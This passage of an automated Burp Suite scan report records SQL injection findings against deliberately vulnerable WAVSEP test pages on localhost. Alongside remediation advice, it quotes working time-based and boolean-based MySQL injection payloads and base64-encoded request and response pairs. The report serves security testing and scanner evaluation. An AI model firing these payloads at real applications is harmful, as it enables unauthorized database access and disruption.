<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20011</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpY1dpdGhvdXRRdW90ZXMtQ29tbWFuZEluamVjdGlvbi1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWNXaXRob3V0UXVvdGVzLUNvbW1hbmRJbmplY3Rpb24tV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZ2lkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjA1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE5IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2602338017641009152</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>51305453 or 1002=01002</b> and <b>83266942 or 1515=1520</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTAxLUluamVjdGlvbkluVmlldy1OdW1lcmljLUJsaW5kLTIwMFZhbGlkUmVzcG9uc2VXaXRoRGVmYXVsdE9uRXhjZXB0aW9uLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMElkZW50aWNhbC9DYXNlMDEtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtQmxpbmQtMjAwVmFsaWRSZXNwb25zZVdpdGhEZWZhdWx0T25FeGNlcHRpb24uanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTEzMjUxMzA1NDUzJTIwb3IlMjAxMDAyJTNkMDEwMDI=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAxMjc1DQoNCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBhIG51bWVyaWMgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGRlZmF1bHQgdmFsaWQgcmVzcG9uc2Ugb24gZXhjZXB0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzIKPC9URD4KPFREPgoxMDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTMzCjwvVEQ+CjxURD4KMTIwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzNQo8L1REPgo8VEQ+CjMwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyMjMKPC9URD4KPFREPgo0MDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNDIzCjwvVEQ+CjxURD4KNTAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjQ1Ngo8L1REPgo8VEQ+CjYwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo3ODkKPC9URD4KPFREPgo3MDEyCjwvVEQ+CjxURD4KRXhwZW5zaXZlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KODk1CjwvVEQ+CjxURD4KODAwMAo8L1REPgo8VEQ+CmVtcHR5CjwvVEQ+CjxURD4KMjAxMC0wMi0wMgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTAxLUluamVjdGlvbkluVmlldy1OdW1lcmljLUJsaW5kLTIwMFZhbGlkUmVzcG9uc2VXaXRoRGVmYXVsdE9uRXhjZXB0aW9uLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMElkZW50aWNhbC9DYXNlMDEtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtQmxpbmQtMjAwVmFsaWRSZXNwb25zZVdpdGhEZWZhdWx0T25FeGNlcHRpb24uanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTEzMjgzMjY2OTQyJTIwb3IlMjAxNTE1JTNkMTUyMA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MzMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGVmYXVsdCB2YWxpZCByZXNwb25zZSBvbiBleGNlcHRpb248L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTAxLUluamVjdGlvbkluVmlldy1OdW1lcmljLUJsaW5kLTIwMFZhbGlkUmVzcG9uc2VXaXRoRGVmYXVsdE9uRXhjZXB0aW9uLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMElkZW50aWNhbC9DYXNlMDEtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtQmxpbmQtMjAwVmFsaWRSZXNwb25zZVdpdGhEZWZhdWx0T25FeGNlcHRpb24uanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU5OjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MzMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGVmYXVsdCB2YWxpZCByZXNwb25zZSBvbiBleGNlcHRpb248L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5191270570521746432</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case02-InjectionInView-String-Blind-200ValidResponseWithDefaultOnException.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>57021006' or '4771'='4771</b> and <b>28709550' or '6749'='6753</b> were each submitted in the username parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
